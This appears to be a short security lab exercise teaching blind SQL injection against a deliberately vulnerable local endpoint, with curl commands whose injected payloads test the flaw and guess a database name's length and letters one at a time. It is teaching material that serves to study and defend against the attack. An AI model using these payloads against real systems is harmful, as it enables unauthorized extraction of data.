# Lab 3: Blind SQL Injection

## Objective
Demonstrate how to extract data character by character when the application doesn't return data directly, but only a "True/False" response.

## Vulnerable Code
The target endpoint is at `/api/lab/blind-vulnerable?id=ID`.
It returns `{"exists": true}` or `{"exists": false}`.

## Instructions

1. **Test for vulnerability**:
```bash
# Returns true
curl "http://localhost:3000/api/lab/blind-vulnerable?id=' OR 1=1--"

# Returns false
curl "http://localhost:3000/api/lab/blind-vulnerable?id=' AND 1=2--"
```

2. **Guess the length of the database name**:
```bash
# If this returns true, the DB name is 8 characters long
curl "http://localhost:3000/api/lab/blind-vulnerable?id=' OR (SELECT LENGTH(current_database()))=8--"
```

3. **Guess the first letter of the DB name**:
```bash
# If this returns true, the first letter starts with 'f'
curl "http://localhost:3000/api/lab/blind-vulnerable?id=' OR (SELECT SUBSTRING(current_database(),1,1))='f'--"
```

## Expected Result
## Comparison: Main App Resilience
After seeing the attack succeed here, try the same payload on your main application to see it fail. 
See [Resilience Demonstration](../resilience_demo.md) for instructions.
